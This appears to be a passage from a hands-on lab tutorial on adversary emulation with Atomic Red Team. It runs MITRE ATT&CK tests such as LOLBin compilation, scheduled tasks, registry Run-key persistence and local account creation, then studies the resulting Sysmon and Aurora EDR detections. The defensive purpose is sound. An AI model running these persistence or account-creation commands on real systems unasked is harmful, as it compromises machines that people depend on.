    Invoke-AtomicTest [-AtomicTechnique]  [-ShowDetails] [-ShowDetailsBrief] [-TestNumbers ]
    [-TestNames ] [-TestGuids ] [-PathToAtomicsFolder ] [-CheckPrereqs]
    [-PromptForInputArgs] [-GetPrereqs] [-Cleanup] [-NoExecutionLog] [-ExecutionLogPath ] [-Force] [-InputArgs
    ] [-TimeoutSeconds ] [-Session ] [-Interactive] [-KeepStdOutStdErrFiles]
    [-LoggingModule ] [-WhatIf] [-Confirm]  []

ALIASES
    None

REMARKS
    None

```

Based on the output of the help cmdlet, it can be seen that the syntax **Invoke-AtomicTest** goes in this format: `Invoke-AtomicTest <NAME> <Optional parameters>`

Note that the NAME placeholder uses the Technique ID of the target Atomic; the value "**ALL"** specifies that every Atomic will be used. The optional parameters will be highlighted in the succeeding sections.

**Listing Atomic Techniques**

Before going to the emulation proper, let's first discuss the importance of understanding the Atomics before running commands.

We
 have previously elaborated the contents of an Atomic file, which 
contains mostly how the emulation works from start to finish. However, 
navigating through the GIT repository and reading the information about 
the techniques you want to emulate may be gruesome. With that in mind, 
this module can use a parameter that provides the details inside an 
Atomic file - **ShowDetailsBrief** and **ShowDetails**.

Administrator: Windows PowerShell

```
PS C:\Users\Administrator> Invoke-AtomicTest T1127 -ShowDetailsBrief
PathToAtomicsFolder = C:\Tools\AtomicRedTeam\atomics

T1127-1 Lolbin Jsc.exe compile javascript to exe
T1127-2 Lolbin Jsc.exe compile javascript to dll

```

The output shows that **ShowDetailsBrief** lists the available tests in the specified Atomic and its corresponding Atomic Test number.

Administrator: Windows PowerShell

```
PS C:\Users\Administrator> Invoke-AtomicTest T1127 -ShowDetails
PathToAtomicsFolder = C:\Tools\AtomicRedTeam\atomics

[********BEGIN TEST*******]
Technique: Trusted Developer Utilities Proxy Execution T1127
Atomic Test Name: Lolbin Jsc.exe compile javascript to exe
Atomic Test Number: 1
Atomic Test GUID: 1ec1c269-d6bd-49e7-b71b-a461f7fa7bc8
Description: Use jsc.exe to compile javascript code stored in scriptfile.js and output scriptfile.exe. https://lolbas-pr
oject.github.io/lolbas/Binaries/Jsc/ https://www.phpied.com/make-your-javascript-a-windows-exe/

Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
copy #{filename} %TEMP%\hello.js
#{jscpath}\#{jscname} %TEMP%\hello.js
Command (with inputs):
copy C:\Tools\AtomicRedTeam\atomics\T1127\src\hello.js %TEMP%\hello.js
C:\Windows\Microsoft.NET\Framework\v4.0.30319\jsc.exe %TEMP%\hello.js

Cleanup Commands:
Command:
del %TEMP%\hello.js
del %TEMP%\hello.exe
---- Dependencies section is redacted, and will be discussed in the next section ---

```

The output above shows that the 
ShowDetails parameter is the verbose version of ShowDetailsBrief, which 
only provides the list of tests inside the Atomic T1127. ****

It
 may not be direct, but these two parameters are significant in 
executing emulation exercises. It is essential to learn and understand 
how many tests will be conducted under an Atomic, how it will be 
performed, and how to clean it up. Knowing these items gives us an 
overview of the impact on the target environment.

**Preparing Atomic Prerequisites**

Remember
 that every Atomic test may require some dependencies, such as binaries 
and files needed for execution. Below is the excerpt of Atomic T1127-1's ****dependency section using the **ShowDetails** parameter**.**

Administrator: Windows PowerShell

```
Dependencies:
Description: JavaScript code file must exist on disk at specified location (C:\Tools\AtomicRedTeam\atomics\T1127\src\hel
lo.js)
Check Prereq Command:
if (Test-Path #{filename}) {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path C:\Tools\AtomicRedTeam\atomics\T1127\src\hello.js) {exit 0} else {exit 1}
Get Prereq Command:
New-Item -Type Directory (split-path #{filename}) -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1127/src/hello.js" -OutFile "#{fil
ename}"
Get Prereq Command (with inputs):
New-Item -Type Directory (split-path C:\Tools\AtomicRedTeam\atomics\T1127\src\hello.js) -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1127/src/hello.js" -OutFile "C:\To
ols\AtomicRedTeam\atomics\T1127\src\hello.js"
[!!!!!!!!END TEST!!!!!!!]

```

It is crucial to verify if the dependencies are met before executing the tests, and this can be done by using the **CheckPrereqs** parameter. In the case of  **Atomic T1127-1**, the file from **C:\Tools\AtomicRedTeam\atomics\T1127\src\hello.js** should exist.

Administrator: Windows PowerShell

```
PS C:\Users\Administrator> Invoke-AtomicTest T1127 -CheckPrereqs
PathToAtomicsFolder = C:\Tools\AtomicRedTeam\atomics

CheckPrereq's for: T1127-1 Lolbin Jsc.exe compile javascript to exe
Prerequisites met: T1127-1 Lolbin Jsc.exe compile javascript to exe
CheckPrereq's for: T1127-2 Lolbin Jsc.exe compile javascript to dll
Prerequisites met: T1127-2 Lolbin Jsc.exe compile javascript to dll

```

If the required binaries, files or scripts do not exist in the machine, the **GetPrereqs**
 parameter can be used. This parameter automatically pulls the 
dependencies from an external resource. It also details what conditions 
are being attempted to satisfy and confirms if the prerequisite is 
already met.

**Note: Usage of the GetPrereqs feature may fail since the provided instance has no outbound internet connection.**

Administrator: Windows PowerShell

```
PS C:\Users\Administrator> Invoke-AtomicTest T1127 -GetPrereqs
PathToAtomicsFolder = C:\Tools\AtomicRedTeam\atomics

GetPrereq's for: T1127-1 Lolbin Jsc.exe compile javascript to exe
Attempting to satisfy prereq: JavaScript code file must exist on disk at specified location (C:\Tools\AtomicRedTeam\atomics\T1127\src\hello.js)
Prereq already met: JavaScript code file must exist on disk at specified location (C:\Tools\AtomicRedTeam\atomics\T1127\src\hello.js)
GetPrereq's for: T1127-2 Lolbin Jsc.exe compile javascript to dll
Attempting to satisfy prereq: JavaScript code file must exist on disk at specified location (C:\Tools\AtomicRedTeam\atomics\T1127\src\LibHello.js)
Prereq already met: JavaScript code file must exist on disk at specified location (C:\Tools\AtomicRedTeam\atomics\T1127\src\LibHello.js)

```

With everything prepared, the only thing left is to execute the Atomic tests.

**Execution**

Let's do the fun part, starting with emulating different MITRE ATT&CK Techniques. First, there are multiple ways to execute the Atomic tests, which will be detailed below.

| Parameter | Example | Details |
| --- | --- | --- |
| TestNumbers | `Invoke-AtomicTest T1127 -TestNumbers 1,2` | Executes tests based on the Atomic test number |
| TestNames | `Invoke-AtomicTest T1127 -TestNames "Lolbin Jsc.exe compile javascript to dll"` | Executes tests based on the Atomic test names |
| TestGuids | `Invoke-AtomicTest T1127 -TestGuids 3fc9fea2-871d-414d-8ef6-02e85e322b80` | Executes tests based on the test GUID |
| N/A | `Invoke-AtomicTest T1127` | Executes all tests under Atomic T1127 |
| N/A | `Invoke-AtomicTest T1127-2` | Executes Atomic Test #2 of T1127 |

As an example, let's now see the tests in action with Atomic T1053.005 - Scheduled Task/Job: Scheduled Task.

Administrator: Windows PowerShell

```
PS C:\Users\Administrator> Invoke-AtomicTest T1053.005 -ShowDetailsBrief
PathToAtomicsFolder = C:\Tools\AtomicRedTeam\atomics

T1053.005-1 Scheduled Task Startup Script
T1053.005-2 Scheduled task Local
T1053.005-3 Scheduled task Remote
T1053.005-4 Powershell Cmdlet Scheduled Task
T1053.005-5 Task Scheduler via VBA
T1053.005-6 WMI Invoke-CimMethod Scheduled Task
T1053.005-7 Scheduled Task Executing Base64 Encoded Commands From Registry
T1053.005-8 Import XML Schedule Task with Hidden Attribute
T1053.005-9 PowerShell Modify A Scheduled Task
# Output shows nine tests are available for T1053.005PS C:\Users\Administrator> Invoke-AtomicTest T1053.005 -TestNumbers 1,2
PathToAtomicsFolder = C:\Tools\AtomicRedTeam\atomics

Executing test: T1053.005-1 Scheduled Task Startup Script
-- redacted --
Done executing test: T1053.005-1 Scheduled Task Startup Script
Executing test: T1053.005-2 Scheduled task Local
-- redacted --
Done executing test: T1053.005-2 Scheduled task Local
# Output shows ONLY TWO tests have been executed from T1053.005
```

You may have observed that the number of 
available tests was listed before conducting the test, and only two 
tests out of nine were executed due to the **TestNumbers** parameter.

**Cleanup**

As
 mentioned throughout the room, cleaning up the mess of emulating 
different techniques is VERY IMPORTANT. The Invoke-AtomicRedTeam module 
also has the option to execute the cleanup commands to revert every 
footprint left by the tests. This can be done by using the **Cleanup** parameter.

Administrator: Windows PowerShell

```
PS C:\Users\Administrator> schtasks /tn T1053_005_OnLogon

Folder: \
TaskName                                 Next Run Time          Status
======================================== ====================== ===============
T1053_005_OnLogon                        N/A                    Ready

PS C:\Users\Administrator> Invoke-AtomicTest T1053.005 -TestNumbers 1,2 -Cleanup
PathToAtomicsFolder = C:\Tools\AtomicRedTeam\atomics

Executing cleanup for test: T1053.005-1 Scheduled Task Startup Script
Done executing cleanup for test: T1053.005-1 Scheduled Task Startup Script
Executing cleanup for test: T1053.005-2 Scheduled task Local
Done executing cleanup for test: T1053.005-2 Scheduled task Local

PS C:\Users\Administrator> schtasks /tn T1053_005_OnLogon
ERROR: The system cannot find the file specified.

```

You may have observed that we executed **schtasks** before cleaning up the scheduled tasks created by the Atomic test **T1053.005**. This only shows that a scheduled task exists and was cleaned up after using the cleanup parameter.

**Revisiting MITRE ATT&CK**

Based on the previous tasks, it was highlighted that the Atomic Red Team framework is heavily tied-up with MITRE ATT&CK. One clear connection is that every Atomic is written for a specific MITRE Technique, with the files of every Atomic named as its corresponding MITRE Technique ID.

In addition, an excerpt from [atomicredteam.io](https://atomicredteam.io/atomics/#collection) shows the available Tactics and Atomics under it, the Collection tactic in this case.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/18d6bf557683dd39a91c09fe0c95187b.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/18d6bf557683dd39a91c09fe0c95187b.png)

This
 correlation shows us that to maximise the Atomic Red Team framework's 
usage, we need to utilise our knowledge in MITRE ATT&CK Framework. 
Let's play again with the ATT&CK Navigator, one of the tools 
introduced in the Threat Modeling room (coming soon!).

# ATT&CK Navigator

The ATT&CK Navigator is hosted in the same virtual machine deployed from the previous task.

You may access it via this link - [http://10.10.195.89/](http://10.10.195.89/)**.**

**Incorporating ATT&CK Navigator into Atomic Red Team**

Choosing
 what Atomic to pick might be overwhelming; thus, we need to have a 
sense of direction when doing threat emulation. By utilising ATT&CK 
Navigator, we can dump the TTPs used by known APTs or cybercriminal 
groups and emulate their Atomics.

To start, create a new layer in the ATT&CK Navigator and choose **Enterprise**.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/543337cf8e5ef39994cd087898ef46f0.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/543337cf8e5ef39994cd087898ef46f0.png)

Then
 use the search functionality and navigate to the threat groups section.
 Let's select admin@338 as our interest group by clicking the select 
button. This action sets the techniques attributed to the **admin@338** group.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/77c01f4a400d2caa8370c6a4163e11d2.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/77c01f4a400d2caa8370c6a4163e11d2.png)

*Click to enlarge the image.*

Next,
 close the search sidebar by re-clicking the search icon, click the 
score button in the upper-right corner and put one (1) as its score. 
This action highlights all selected techniques, which eases out the 
readability of the matrix.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/482fb905c28fab69fb84aa079cf0b9fa.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/482fb905c28fab69fb84aa079cf0b9fa.png)

*Click to enlarge the image.*

Lastly,
 let's sort out the techniques per column to place the scored technique 
in the topmost position. Click the filter button until it is set to **sorting by score descending**, and eventually click the **expand sub-techniques** button to display all highlighted techniques and sub-techniques.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/3ad5dde217f469a8f381d49caad2abb9.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/3ad5dde217f469a8f381d49caad2abb9.png)

*Click to enlarge the image.*

Our steps should reflect all techniques we want to emulate from our selected threat group.

**Emulation of Admin@338 Group**

The
 following action is to list all techniques highlighted from the 
ATT&CK Navigator. It is essential to take note of the Tactic, 
Technique and its corresponding Technique ID, as every Atomic is named 
with the Technique ID. You may hover the mouse icon in the techniques to
 see the technique ID. Below is the summarised results we got from 
ATT&CK Navigator.

| Tactic | Technique ID | Technique |
| --- | --- | --- |
| Initial Access | T1566.001 | Spearphishing Attachment |
| Execution | T1203 | Exploitation for Client Execution |
| Execution | T1059.003 | Command and Scripting Interpreter: Windows Command Shell |
| Discovery | T1083 | File and Directory Discovery |
| Discovery | T1082 | System Information Discovery |
| Discovery | T1016 | System Network Configuration Discovery |
| Discovery | T1049 | System Network Connections Discovery |
| Discovery | T1007 | System Service Discovery |
| Discovery | T1087.001 | Account Discovery: Local Account |

We have extracted nine (9) out of all the techniques in MITRE ATT&CK. The next thing we need to do is to determine if an Atomic exists for these techniques.

Administrator: Windows PowerShell

```
PS C:\Users\Administrator>ls C:\Tools\AtomicRedTeam\atomics | Where-Object Name -Match "T1566.001|T1203|T1059.003|T1083|T1082|T1016|T1049|T1007|T1087.001"

    Directory: C:\Tools\AtomicRedTeam\atomics

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         1/3/2023   5:20 PM                T1007
d-----         1/3/2023   5:20 PM                T1016
d-----         1/3/2023   5:20 PM                T1049
d-----         1/3/2023   5:20 PM                T1059.003
d-----         1/3/2023   5:20 PM                T1082
d-----         1/3/2023   5:20 PM                T1083
d-----         1/3/2023   5:20 PM                T1087.001
d-----         1/3/2023   5:21 PM                T1566.001

```

Eight out of nine techniques are available to be emulated. Before 
executing the tests, we must verify each technique and list all known 
tests for each Atomic.

Administrator: Windows PowerShell

```
PS C:\Users\Administrator> 'T1566.001','T1059.003','T1083','T1082','T1016','T1049','T1007','T1087.001' | ForEach-Object {echo "Enumerating $_"; Invoke-AtomicTest $_ -ShowDetailsBrief }
Enumerating T1566.001
PathToAtomicsFolder = C:\Tools\AtomicRedTeam\atomics

T1566.001-1 Download Macro-Enabled Phishing Attachment
T1566.001-2 Word spawned a command shell and used an IP address in the command line
Enumerating T1059.003
PathToAtomicsFolder = C:\Tools\AtomicRedTeam\atomics

T1059.003-1 Create and Execute Batch Script
T1059.003-2 Writes text to a file and displays it.
T1059.003-3 Suspicious Execution via Windows Command Shell
T1059.003-4 Simulate BlackByte Ransomware Print Bombing
T1059.003-5 Command Prompt read contents from CMD file and execute
Enumerating T1083
PathToAtomicsFolder = C:\Tools\AtomicRedTeam\atomics

T1083-1 File and Directory Discovery (cmd.exe)
T1083-2 File and Directory Discovery (PowerShell)
T1083-5 Simulating MAZE Directory Enumeration
T1083-6 Launch DirLister Executable
Enumerating T1082
PathToAtomicsFolder = C:\Tools\AtomicRedTeam\atomics

T1082-1 System Information Discovery
T1082-6 Hostname Discovery (Windows)
T1082-8 Windows MachineGUID Discovery
--- redacted for brevity ---

```

In addition, we need to check the prerequisites of each Atomic before starting the emulation.

Administrator: Windows PowerShell

```
PS C:\Users\Administrator>'T1566.001','T1059.003','T1083','T1082','T1016','T1049','T1007','T1087.001' | ForEach-Object {echo "Enumerating $_"; Invoke-AtomicTest $_ -CheckPrereqs }
Enumerating T1566.001
PathToAtomicsFolder = C:\Tools\AtomicRedTeam\atomics

CheckPrereq's for: T1566.001-1 Download Macro-Enabled Phishing Attachment
Prerequisites met: T1566.001-1 Download Macro-Enabled Phishing Attachment
CheckPrereq's for: T1566.001-2 Word spawned a command shell and used an IP address in the command line
Prerequisites not met: T1566.001-2 Word spawned a command shell and used an IP address in the command line
        [*] Microsoft Word must be installed

Try installing prereq's with the -GetPrereqs switch
Enumerating T1059.003
PathToAtomicsFolder = C:\Tools\AtomicRedTeam\atomics

CheckPrereq's for: T1059.003-1 Create and Execute Batch Script
Prerequisites not met: T1059.003-1 Create and Execute Batch Script
        [*] Batch file must exist on disk at specified location ($env:TEMP\T1059.003_script.bat)

Try installing prereq's with the -GetPrereqs switch
CheckPrereq's for: T1059.003-2 Writes text to a file and displays it.
Prerequisites met: T1059.003-2 Writes text to a file and displays it.
CheckPrereq's for: T1059.003-3 Suspicious Execution via Windows Command Shell
Prerequisites met: T1059.003-3 Suspicious Execution via Windows Command Shell
CheckPrereq's for: T1059.003-4 Simulate BlackByte Ransomware Print Bombing
Prerequisites not met: T1059.003-4 Simulate BlackByte Ransomware Print Bombing
        [*] File to print must exist on disk at specified location ($env:temp\T1059_003note.txt)

Try installing prereq's with the -GetPrereqs switch
CheckPrereq's for: T1059.003-5 Command Prompt read contents from CMD file and execute
Prerequisites met: T1059.003-5 Command Prompt read contents from CMD file and execute
Enumerating T1083
PathToAtomicsFolder = C:\Tools\AtomicRedTeam\atomics

CheckPrereq's for: T1083-1 File and Directory Discovery (cmd.exe)
Prerequisites met: T1083-1 File and Directory Discovery (cmd.exe)
CheckPrereq's for: T1083-2 File and Directory Discovery (PowerShell)
Prerequisites met: T1083-2 File and Directory Discovery (PowerShell)
CheckPrereq's for: T1083-5 Simulating MAZE Directory Enumeration
Prerequisites met: T1083-5 Simulating MAZE Directory Enumeration
CheckPrereq's for: T1083-6 Launch DirLister Executable
Prerequisites not met: T1083-6 Launch DirLister Executable
        [*] DirLister.exe must exist in the specified path C:\Tools\AtomicRedTeam\atomics\T1083\bin\DirLister.exe

Try installing prereq's with the -GetPrereqs switch
--- redacted for brevity ---

```

Given the number of tests for each Atomic, as shown above, we will 
only select one for brevity. Let's also focus on the tests that have met
 the prerequisites.

- **T1059.003-3** - Suspicious Execution via Windows Command Shell
- **T1083-1** - File and Directory Discovery (cmd.exe)
- **T1082-6** - Hostname Discovery (Windows)
- **T1016-1** - System Network Configuration Discovery on Windows
- **T1049-1** - System Network Connections Discovery
- **T1007-2 -** System Service Discovery - net.exe
- **T1087.001-9** - Enumerate all accounts via PowerShell (Local)
- **T1566.001-1 -** Download Macro-Enabled Phishing Attachment

The only thing left now is to emulate the Atomics. Unlike the PowerShell
 command snippets above, we will only execute the tests one at a time. 
This is to observe the emulation and not be overwhelmed by the terminal 
output.

Administrator: Windows PowerShell

```
PS C:\Users\Administrator>Invoke-AtomicTest T1059.003-3

```

**Emulation to Detection**

From
 the previous tasks, we learned to operate with the Atomic Red Team 
framework and emulate different techniques across the mapping of MITRE 
ATT&CK. Now, let's wear our blue team hat and apply the benefits of 
threat emulation in detection engineering.

# Observing Telemetry

The
 easiest way to understand different TTPs is to see them first-hand. We 
will learn and observe how techniques work by checking the events/logs 
generated by the Atomic tests. For this section, let's use the tests 
from Atomic T1547.001, which is all about Boot or Logon Autostart 
Execution: Registry Run Keys / Startup FolderPermalink.

Administrator: Windows PowerShell

```
PS C:\Users\Administrator> Invoke-AtomicTest T1547.001 -CheckPrereqs
PathToAtomicsFolder = C:\Tools\AtomicRedTeam\atomics

CheckPrereq's for: T1547.001-1 Reg Key Run
Prerequisites met: T1547.001-1 Reg Key Run
CheckPrereq's for: T1547.001-2 Reg Key RunOnce
Prerequisites met: T1547.001-2 Reg Key RunOnce
CheckPrereq's for: T1547.001-3 PowerShell Registry RunOnce
Prerequisites met: T1547.001-3 PowerShell Registry RunOnce
CheckPrereq's for: T1547.001-4 Suspicious vbs file run from startup Folder
Prerequisites met: T1547.001-4 Suspicious vbs file run from startup Folder
CheckPrereq's for: T1547.001-5 Suspicious jse file run from startup Folder
Prerequisites met: T1547.001-5 Suspicious jse file run from startup Folder
CheckPrereq's for: T1547.001-6 Suspicious bat file run from startup Folder
Prerequisites met: T1547.001-6 Suspicious bat file run from startup Folder
CheckPrereq's for: T1547.001-7 Add Executable Shortcut Link to User Startup Folder
Prerequisites met: T1547.001-7 Add Executable Shortcut Link to User Startup Folder
CheckPrereq's for: T1547.001-8 Add persistance via Recycle bin
Prerequisites met: T1547.001-8 Add persistance via Recycle bin
CheckPrereq's for: T1547.001-9 SystemBC Malware-as-a-Service Registry
Prerequisites met: T1547.001-9 SystemBC Malware-as-a-Service Registry
CheckPrereq's for: T1547.001-10 Change Startup Folder - HKLM Modify User Shell Folders Common Startup Value
Prerequisites met: T1547.001-10 Change Startup Folder - HKLM Modify User Shell Folders Common Startup Value
CheckPrereq's for: T1547.001-11 Change Startup Folder - HKCU Modify User Shell Folders Startup Value
Prerequisites met: T1547.001-11 Change Startup Folder - HKCU Modify User Shell Folders Startup Value
CheckPrereq's for: T1547.001-12 HKCU - Policy Settings Explorer Run Key
Prerequisites met: T1547.001-12 HKCU - Policy Settings Explorer Run Key
CheckPrereq's for: T1547.001-13 HKLM - Policy Settings Explorer Run Key
Prerequisites met: T1547.001-13 HKLM - Policy Settings Explorer Run Key
CheckPrereq's for: T1547.001-14 HKLM - Append Command to Winlogon Userinit KEY Value
Prerequisites met: T1547.001-14 HKLM - Append Command to Winlogon Userinit KEY Value
CheckPrereq's for: T1547.001-15 HKLM - Modify default System Shell - Winlogon Shell KEY Value
Prerequisites met: T1547.001-15 HKLM - Modify default System Shell - Winlogon Shell KEY Value
CheckPrereq's for: T1547.001-16 secedit used to create a Run key in the HKLM Hive
Prerequisites met: T1547.001-16 secedit used to create a Run key in the HKLM Hive

```

There are sixteen available tests for this Atomic, and all have
 prerequisites met. All of the tests can be executed without any 
problems.

**Sysmon**

For this task, we will view logs generated by Atomics through Sysmon. Let's fire up the Event Viewer and navigate to `Applications and Services > Microsoft > Windows > Sysmon`. Once done, clear the existing records and start executing the first test.

Administrator: Windows PowerShell

```
PS C:\Users\Administrator> Invoke-AtomicTestT1547.001 -TestNumbers 1
PathToAtomicsFolder = C: \Tools\AtomicRedTeam\atomics

Executing test: T1547.001-1 Reg Key Run
The operation completed successfully
Done executing test: T1547.001-1 Reg Key Run

```

Refresh the Event Viewer to view the latest updates, and always clear the logs before executing the next Atomic test.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/ff9645707cc330a2ecaeb18794b82f4d.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/ff9645707cc330a2ecaeb18794b82f4d.png)

**Note:
 Log clearing will only be practical if the emulation is done in a test 
environment. You may not have the luxury of clearing the logs in a 
production setup. This may require an additional understanding of the 
Atomic breakdown before executing it to know what logs are expected to 
appear.**

Upon completing Atomic Test **T1547.001-1**, it generated five records. We can ignore the first two logs as it is part of **Invoke-AtomicTest**'s execution; hence we can overlook the execution of the following binaries with PowerShell being its parent process throughout this task:

- whoami.exe
- hostname.exe

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/98f70d46808f8b908ba2f03aa19de302.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/98f70d46808f8b908ba2f03aa19de302.png)

*Click to enlarge the image.*

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/efafdff857ba9f6a8293b3651d35d45a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/efafdff857ba9f6a8293b3651d35d45a.png)

*Click to enlarge the image.*

Ignoring
 the first two entries, we are left with three logs generated by the 
emulated Atomic test. The following three entries are Process Create 
events (Sysmon Event ID 1) and a single Registry Value Set event (Sysmon Event ID 13).

**Process Create Logs**

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/4d0bfe65e7dff32fd9d8a5ccbe1f0fb8.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/4d0bfe65e7dff32fd9d8a5ccbe1f0fb8.png)

*Click to enlarge the image.*

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/ab9fe9df185fce84777b21a79d36fc50.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/ab9fe9df185fce84777b21a79d36fc50.png)

*Click to enlarge the image.*

**Registry Value Set Log**

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/20f3a410819c76c02924ae192beabbf6.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/20f3a410819c76c02924ae192beabbf6.png)

*Click to enlarge the image.*

Based on the images above, we can summarise the events generated by Atomic test T1547.001-1 with the following information:

- The test generated three significant events: two Process Create events and one Registry Value Set event.
- The two Process Create events are caused by the execution of the **reg.exe** binary via the **cmd.exe** **/c** parameter.
- For this type of attack, ****the **reg.exe** binary is being utilised by threat actors to modify the registry key **\SOFTWARE\Microsoft\Windows\CurrentVersion\Run**.
- Lastly, the Registry Value points to a malicious binary (**C:\Path\AtomicRedTeam.exe)**, which indicates that the binary will be executed during user logon.

We
 have successfully reflected the first Atomic Test via Sysmon logs. 
Let's continue emulating the subsequent tests with Aurora EDR to test its detection capabilities.

# Aurora EDR

**Note: ﻿If you are unfamiliar with Aurora EDR, you may proceed with this [room](https://tryhackme.com/room/auroraedr) first.**

For a quick recap, Aurora
 is a Windows endpoint agent that uses Sigma rules and Indicators of 
Compromise (IOCs) to detect threat patterns on local event streams using
 Event Tracing for Windows (ETW). It is easy to correlate our previous 
learnings because Sigma rules are associated with the MITRE ATT&CK framework.

To run Aurora, open a PowerShell window. Then navigate to **C:\Tools\Aurora** and execute **aurora-agent-64.exe**.

Administrator: C:\Windows\System32\cmd.exe

```
C:\Users\Administrator>cd C:\Tools\Aurora
C:\Tools\Aurora> .\aurora-agent-64.exe

```

Wait for the message that states **Aurora Agent started** before going back to the execution of Atomic Test **T1547.001-2**. Once the tool has successfully loaded, proceed to the next Atomic Test.

Administrator: Windows PowerShell

```
PS C:\Users\Administrator> Invoke-AtomicTest T1547.001 -TestNumbers 2
PathToAtomicsFolder = C:\Tools\AtomicRedTeam\atomics

Executing test: T1547.001-2 Reg Key RunOnce
The operation completed successfully.
Done executing test: T1547.001-2 Reg Key RunOnce

```

After execution, you may observe that the window running Aurora EDR has generated several detections related to

**Registry Modification**

.

**Note: You may ignore the detection of whoami.exe, as shown in the first two detection logs.**

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/bd2cef472ccda348ec096a8c588c8ee5.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/bd2cef472ccda348ec096a8c588c8ee5.png)

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/06cedc23c6e7efcedc3c01740d59b5b0.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/06cedc23c6e7efcedc3c01740d59b5b0.png)

The results summarise the following information:

- Sigma Rule Title, Description, and Notable False Positives
- Sigma match strings used
- Execution details such as Process Names, Command-line parameters and Hashes

The
 execution above is an excellent example of testing deployed rules by 
utilising the Atomic Red Team for threat emulation. Moving forward, you 
may use the methodology gained from this task to test and improve your 
existing detection rules.

**Customising Atomic Red Team**

In
 some cases, the Atomic Red Team cannot cater to the organisation's 
needs, such as emulating MITRE techniques that do not have a 
corresponding Atomic or tailoring a specific use case that only fits 
within a particular infrastructure or configuration setup. With that in mind, we need to be capable of creating custom Atomic tests and maximising tests via custom arguments.

# Custom Input Arguments

Going back to the contents of the Atomic files, the **input_argument** field defines a hashtable wherein
 the key is the input name, and the value is another hashtable 
specifying the input arguments. Let's use the Create Account: Local 
Account technique as an example to expound this further.

T1136.001 - Create Account: Local Account

```
user@ATOMIC$ cat T1136.001/T1136.001.yaml...
  input_arguments:
    username:
      description: Username of the user to create
      type: String
      default: T1136.001_CMD
    password:
      description: Password of the user to create
      type: String
      default: T1136.001_CMD!
...

```

Using T1136.001 as an example, you may observe that the snippet above showcases two input names with the following information:

| Input Name | Input Definition |
| --- | --- |
| username | • This input argument is described as the "Username of the user to create"
• The username input type is **String**
• The value defaults to **T1136.001_CMD** |
| password | • This input argument is described as the "Password of the user to create"
• The username input type is **String**
• The value defaults to **T1136.001_CMD!** |

Knowing these, executing this Atomic test will create a user named T1136.001_CMD, having T1136.001_CMD! as its password.

We can test this out and verify it manually by executing Atomic Test #3 of T1136.001.

powershell.exe

```
PS C:\Users\Administrator> Invoke-AtomicTest T1136.001 -TestNumbers 3
PathToAtomicsFolder = C:\Tools\AtomicRedTeam\atomics

Executing test: T1136.001-3 Create a new user in a command prompt
The password does not meet the password policy requirements. Check the minimum password length, password complexity and password history requirements.
More help is available by typing NET HELPMSG 2245.
Done executing test: T1136.001-3 Create a new user in a command prompt

```

powershell.exe

```
PS C:\Users\Administrator> net user

User accounts for \\ATOMIC

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
WDAGUtilityAccount
The command completed successfully.

```

Based on the output of the Atomic test and the `net user`
 command,  the user was not created successfully due to the existing 
password policy requirement. We can try customising the input arguments 
and replacing the password to satisfy the policy.

For this, we can either use one of these two parameters:

- **PromptForInputArgs** set the values of the input arguments interactively

powershell.exe

```
PS C:\Users\Administrator> Invoke-AtomicTest T1136.001 -TestNumbers 3 -PromptForInputArgs

```

- **InputArgs** - pass a hashtable that contains the key-value pair of input arguments and its values

powershell.exe

```
PS C:\Users\Administrator> $customArgs = @{ "username" = "THM_Atomic"; "password" = "p@ssw0rd" }
PS C:\Users\Administrator> Invoke-AtomicTest T1136.001 -TestNumbers 3 -InputArgs $customArgs
PathToAtomicsFolder = C:\Tools\AtomicRedTeam\atomics

Executing test: T1136.001-3 Create a new user in a command prompt
The command completed successfully.
Done executing test: T1136.001-3 Create a new user in a command prompt

```

